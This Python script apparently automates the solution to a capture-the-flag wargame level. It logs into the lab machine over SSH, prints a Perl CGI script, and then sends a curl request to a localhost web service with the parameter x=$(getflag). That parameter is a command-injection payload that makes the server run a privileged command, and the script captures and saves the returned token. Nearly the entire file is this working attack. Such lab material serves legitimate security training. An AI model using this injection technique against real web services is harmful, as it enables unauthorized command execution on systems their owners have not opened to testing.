import sys
sys.path.append("../..")

from utils.ssh import sanitize_token, connect_by_previous, exec, save_token
from utils.text import print_title, print_output

client = connect_by_previous()
script_content = exec(client, 'cat level04.pl', title='Read script')
print_output(script_content)
print_title('CGI server, print value of X param (GET)')

response = exec(client, "curl 'http://localhost:4747?x=$(getflag)'", title='Send request with x=$(getflag)')[0]
print_output(response, 'Server response')

token = sanitize_token(response)
save_token(token)

client.close()
